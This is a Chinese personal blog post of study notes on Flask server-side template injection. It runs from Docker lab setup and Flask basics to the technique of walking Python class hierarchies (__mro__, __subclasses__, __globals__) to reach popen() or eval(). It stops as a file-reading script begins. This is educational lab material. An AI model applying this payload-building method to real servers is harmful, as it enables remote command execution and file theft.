@@ -1,0 +1,911 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta name="description" content="本网站是个人兴趣爱好，总结分享经验，记录生活点滴的平台，希望在以后的学习旅途中，走出自己的风景。" />
+      
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>SSTI漏洞总结学习 |  n0rt6&#39;s blog</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.jpg" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <!--浏览器搞笑标题-->
+<script type="text/javascript" src="\js\FunnyTitle.js"></script>
+<!--点击爱心-->
+<script type="text/javascript" src="\js\clickLove.js"></script>
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-SSTI漏洞总结学习"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  SSTI漏洞总结学习
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2023/11/15/SSTI%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%AD%A6%E4%B9%A0/" class="article-date">
+  <time datetime="2023-11-15T09:58:43.000Z" itemprop="datePublished">2023-11-15</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/">知识点</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">2.1k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">9 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <meta name="referrer" content="no-referrer"/>
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>观看B站教学视频<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1tj411u7Bx/?spm_id_from=333.999.0.0">重庆橙子科技</a> 的笔记，个人认为质量很好，记录一下。</p>
+<h2 id="靶场部署"><a href="#靶场部署" class="headerlink" title="靶场部署"></a>靶场部署</h2><h3 id="docker地址"><a href="#docker地址" class="headerlink" title="docker地址"></a>docker地址</h3><p>mcc0624&#x2F;flask_ssti:last</p>
+<h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><p>前提是你服务器已经安装了docker，还有提一点，注意云服务器安全组的配置<br>拉取镜像</p>
+<blockquote>
+<p>docker pull mcc0624&#x2F;flask_ssti:last</p>
+</blockquote>
+<p><strong>查看镜像</strong><br><img src="https://img-blog.csdnimg.cn/7c2275fe3e05482bbfcb703c1fd5cd66.png" alt="123"><br>此时已经拉取到本地</p>
+<blockquote>
+<p>指定端口运行容器并且进入命令行<br><code>docker run -p 18022:80 -i -t mcc0624/flask_ssti:last bash -c &#39;/etc/rc.local; /bin/sh&#39;</code></p>
+</blockquote>
+<p>开启&#x2F;关闭容器</p>
+<blockquote>
+<p>开启<br>docker run -p 8888:80 -t mcc0624&#x2F;flask_ssti:last<br>关闭<br>docker stop imageid</p>
+</blockquote>
+<h2 id="Python-venv"><a href="#Python-venv" class="headerlink" title="Python venv"></a>Python venv</h2><p>可以把它想象成一个容器，该容器供你用来存放你的Python脚本以及安装各种Python第三方模块，容器里的环境和本机是完全分开的(就像你在Windows主机上通过Vmware跑一台Ubuntu或者CentOS的虚拟主机一样)，也就是说你在venv下通过pip安装的Python第三方模块是不会存在于你本机的环境下的。</p>
+<h3 id="安装venv"><a href="#安装venv" class="headerlink" title="安装venv"></a>安装venv</h3><blockquote>
+<p>apt install python3-venv</p>
+</blockquote>
+<p>创建venv环境安装flask<br>进入&#x2F;opt目录，运行命令：</p>
+<blockquote>
+<p>python3 -m venv flask1<br>cd fl*<br>l<br>这里包含python虚拟环境的组件<br><img src="https://img-blog.csdnimg.cn/f544a20f541b42eea056ad0d2589e719.png" alt="1"></p>
+</blockquote>
+<p>此时咱们在&#x2F;opt目录创建一个文件demo.py<br>然后执行文件</p>
+<blockquote>
+<p>python3 demo.py<br><img src="https://img-blog.csdnimg.cn/7a1cb258217d4db0b691dae1a8d34312.png" alt="123"></p>
+</blockquote>
+<p>请注意，这里使用的物理主机的python环境执行的，那么我们如何使用虚拟的python环境来执行这个文件呢？</p>
+<blockquote>
+<p>执行flask1路径下的python<br><img src="https://img-blog.csdnimg.cn/36ecf712be56493d8eef85062c3b2bd8.png" alt="123"></p>
+</blockquote>
+<p>这时就是用虚拟的python环境执行该文件<br>当然还可以这样</p>
+<blockquote>
+<p>cd flask1<br>进入虚拟环境<br>source .&#x2F;bin&#x2F;activate<br>退出虚拟环境<br>dactivate</p>
+</blockquote>
+<h2 id="虚拟环境下安装flask以及应用"><a href="#虚拟环境下安装flask以及应用" class="headerlink" title="虚拟环境下安装flask以及应用"></a>虚拟环境下安装flask以及应用</h2><p><strong>安装</strong></p>
+<blockquote>
+<p>pip install flask</p>
+</blockquote>
+<p><strong>应用</strong></p>
+<blockquote>
+<p>vim demo.py</p>
+</blockquote>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flsak <span class="token keyword">import</span> Flask
+app<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> <span class="token string">"hello benben"</span>
+
+<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这个时候默认端口为5000<br>如果你想要改变端口那就修改文件</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flsak <span class="token keyword">import</span> Flask
+app<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> <span class="token string">"hello benben"</span>
+
+<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>如果想要开启debug模式，只需加上<code>debug=True</code></p>
+<h3 id="Flask变量规则"><a href="#Flask变量规则" class="headerlink" title="Flask变量规则"></a>Flask变量规则</h3><p>通过向规则参数添加变量部分，可以动态构建URL。此变量部分标记为<variable-name>。它作为关键字参数传递给与规则相关联的函数。</p>
+<p>在以下示例中，route()装饰器的规则参数包含附加到URL ‘&#x2F;hello’的<name>。因此，如果在浏览器中输入<a target="_blank" rel="noopener" href="http://localhost:5000/hello/w3cschool%E4%BD%9C%E4%B8%BAURL%EF%BC%8C%E5%88%99&#39;w3cschool&#39;%E5%B0%86%E4%BD%9C%E4%B8%BA%E5%8F%82%E6%95%B0%E6%8F%90%E4%BE%9B%E7%BB%99hello()%E5%87%BD%E6%95%B0%E3%80%82">http://localhost:5000/hello/w3cschool作为URL，则&#39;w3cschool&#39;将作为参数提供给hello()函数。</a></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+ 
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/hello/&lt;name>'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">hello_name</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+   <span class="token keyword">return</span> <span class="token string">'Hello %s!'</span> <span class="token operator">%</span> name
+ 
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+   app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://img-blog.csdnimg.cn/b34afe36bbf44367b590efa57654ec49.png" alt="123"><br>除了默认字符串变量部分之外，还可以使用以下转换器构建规则：<br><img src="https://img-blog.csdnimg.cn/33c6bdc86942423798ca61af1cc428a2.png" alt="1"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+ 
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/blog/&lt;int:postID>'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">show_blog</span><span class="token punctuation">(</span>postID<span class="token punctuation">)</span><span class="token punctuation">:</span>
+   <span class="token keyword">return</span> <span class="token string">'Blog Number %d'</span> <span class="token operator">%</span> postID
+ 
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/rev/&lt;float:revNo>'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">revision</span><span class="token punctuation">(</span>revNo<span class="token punctuation">)</span><span class="token punctuation">:</span>
+   <span class="token keyword">return</span> <span class="token string">'Revision Number %f'</span> <span class="token operator">%</span> revNo
+ 
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+   app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="Flask-HTTP方法"><a href="#Flask-HTTP方法" class="headerlink" title="Flask HTTP方法"></a>Flask HTTP方法</h3><p><img src="https://img-blog.csdnimg.cn/e76311f64df0491b84805ff582c04d5a.png" alt="123"></p>
+<h3 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h3><p>GET方法用于从服务器获取数据。它没有请求体，所有参数都包含在URL中。在Flask中，我们可以使用route装饰器来定义GET路由。例如，以下代码演示如何定义一个简单的GET路由：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
+
+app<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/user/&lt;username>'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">get_user</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> <span class="token string">'Hello,%s!'</span><span class="token operator">%</span> username
+
+<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://img-blog.csdnimg.cn/5e9f57615db7473e9484adf03b5943a3.png" alt="123"></p>
+<h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><p>POST方法用于向服务器提交数据。在Flask中，我们可以通过route装饰器将POST路由关联到视图函数。以下是一个简单的POST路由的示例：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>request
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/user'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">create_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    json_data<span class="token operator">=</span>request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    name<span class="token operator">=</span>json_data<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>
+    email<span class="token operator">=</span>json_data<span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span>
+
+    <span class="token keyword">return</span> <span class="token string">'User created successfully'</span>
+
+<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://img-blog.csdnimg.cn/4c4bda8917ad457b8be45f8e97bb41e4.png" alt="123"></p>
+<h3 id="PUT"><a href="#PUT" class="headerlink" title="PUT"></a>PUT</h3><p>PUT方法用于向服务器更新数据。在Flask中，我们可以通过route装饰器将PUT路由关联到视图函数。以下是一个简单的PUT路由示例：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/user/&lt;id>'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'PUT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">update_user</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    json_data <span class="token operator">=</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    name <span class="token operator">=</span> json_data<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>
+    email <span class="token operator">=</span> json_data<span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span>
+    <span class="token comment"># ... code to update user ...</span>
+    <span class="token keyword">return</span> <span class="token string">'User updated successfully'</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://img-blog.csdnimg.cn/bc07498f2db246ac8a70637a9a6cb6b2.png" alt="456"></p>
+<h3 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h3><p>DELETE方法用于从服务器删除数据。在Flask中，我们可以通过route装饰器将DELETE路由关联到视图函数。以下是一个简单的DELETE路由示例：</p>
+<pre class="line-numbers language-pyhon" data-language="pyhon"><code class="language-pyhon">from flask import Flask
+
+app &#x3D; Flask(__name__)
+
+@app.route(&#39;&#x2F;user&#x2F;&lt;id&gt;&#39;, methods&#x3D;[&#39;DELETE&#39;])
+def delete_user(id):
+    # ... code to delete user ...
+    return &#39;User deleted successfully&#39;
+
+if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
+    app.run(debug&#x3D;True,host&#x3D;&#39;0.0.0.0&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://img-blog.csdnimg.cn/97c43ec5172743e5b3b20c1f0095ccb8.png" alt="789"></p>
+<h2 id="Flask模板介绍"><a href="#Flask模板介绍" class="headerlink" title="Flask模板介绍"></a>Flask模板介绍</h2><p>介绍：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42577686/article/details/124524571">Flask模板的介绍与使用</a><br><img src="https://img-blog.csdnimg.cn/2bb1224d9c574e6abbfbfa4cf27108f1.png" alt="46"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#app.py</span>
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span>request
+
+app<span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    my_str<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'ben'</span><span class="token punctuation">)</span>
+    my_int<span class="token operator">=</span><span class="token number">123</span>
+    my_array<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>
+    my_dict<span class="token operator">=</span><span class="token punctuation">&#123;</span>
+        <span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'daming'</span><span class="token punctuation">,</span>
+        <span class="token string">'age'</span><span class="token punctuation">:</span><span class="token number">18</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span>my_str<span class="token operator">=</span>my_str<span class="token punctuation">,</span>my_int<span class="token operator">=</span>my_int<span class="token punctuation">,</span>my_array<span class="token operator">=</span>my_array<span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">#创建一个目录templates，目录下创建文件index.html
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+模板html展示页面
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
+&#123;&#123;my_str&#125;&#125;
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://img-blog.csdnimg.cn/38258db68de7475aa1b8956574a62d0c.png" alt="456"></p>
+<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p><img src="https://img-blog.csdnimg.cn/a18c5bfd821244b4aa43c18c4d6fbbd2.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/da03c4e385134b32b89dad29d09e8b47.png" alt="456"></p>
+<h3 id="继承关系"><a href="#继承关系" class="headerlink" title="继承关系"></a>继承关系</h3><p><img src="https://img-blog.csdnimg.cn/977f7e20ead84e11ad7203444a349bbc.png" alt="456"><br>在 python 中，类之间是会有继承关系的，也就是派生类（子类）与基类（父类）的关系，这可以理解为父子关系。在这个父子关系中的最高级，就是 object 。也就是说，object 是祖宗类。<br>一般来说，SSTI 构造 payload 的思想，就是要通过各个数据类型 Numbers（数字）String（字符串）List（列表）Tuple（元组）Dictionary（字典） 这些子类，一直往上找到 object ，然后再通过找 object 类可以利用的子类。可以利用的子类，就是这个子类的方法（popen() eval()等方法）或属性可以利用。</p>
+<p>写一个代码理解一下</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">:</span><span class="token keyword">pass</span> <span class="token comment">#定义了一个名为A的空类</span>
+<span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">pass</span> <span class="token comment">#定义了一个名为B的类，它继承自A类</span>
+<span class="token keyword">class</span> <span class="token class-name">C</span><span class="token punctuation">(</span>B<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">pass</span> <span class="token comment">#定义了一个名为C的类，它继承自B类</span>
+<span class="token keyword">class</span> <span class="token class-name">D</span><span class="token punctuation">(</span>B<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">pass</span> <span class="token comment">#定义了一个名为D的类，它继承自B类</span>
+c<span class="token operator">=</span>C<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#创建了一个C类的实例c</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里将C类实例化为一个对象，打印出实例c的类对象</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">)</span><span class="token comment"># __class__ 是一个特殊的属性，用于获取对象的类</span>
+<span class="token comment">#结果&lt;class '__main__.C'></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">)</span>
+<span class="token comment">#结果&lt;class '__main__.B'></span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__base__<span class="token punctuation">)</span>
+<span class="token comment">#结果&lt;class '__main__.A'></span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__base__<span class="token punctuation">)</span>
+<span class="token comment">#结果&lt;class 'object'></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>最终指向就是Object<br>还有一种方法可以去显示出来</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">)</span><span class="token comment"># __mro__ 是一个特殊的属性，用于获取一个类或实例的方法解析顺序（Method Resolution Order</span>
+<span class="token comment">#结果(&lt;class '__main__.C'>, &lt;class '__main__.B'>, &lt;class '__main__.A'>, &lt;class 'object'>)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token comment">#结果 &lt;class '__main__.C'></span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token comment">#结果 &lt;class '__main__.B'></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://img-blog.csdnimg.cn/a6a4c1b498844cbfa0315f7a38647fa1.png" alt="123"></p>
+<h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">__dict__ 保存类实例或对象实例的属性变量键值对字典
+__class__  返回类型所属的对象
+__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
+__bases__   返回该对象所继承的基类
+// __base__和__mro__都是用来寻找基类的
+
+__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
+__init__  类的初始化方法
+__globals__  对包含函数全局变量的字典的引用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="检查漏洞"><a href="#检查漏洞" class="headerlink" title="检查漏洞"></a>检查漏洞</h3><p><img src="https://img-blog.csdnimg.cn/caeb1dcd2e444e3889a444e1dba2c909.png" alt="546"><br><img src="https://img-blog.csdnimg.cn/d6d9edfdac9a48c0a5d30ce2ceca4a32.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/bdc2dafed414478985d6ed6fabec0e45.png" alt="456"></p>
+<h3 id="常用注入模块"><a href="#常用注入模块" class="headerlink" title="常用注入模块"></a>常用注入模块</h3><p><img src="https://img-blog.csdnimg.cn/3dec8eda7ce74583aaae7bacab9cdb0d.png" alt="123"></p>
+<h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><p>python脚本：POST提交”name“的值，通过for循环查找所需字符串</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
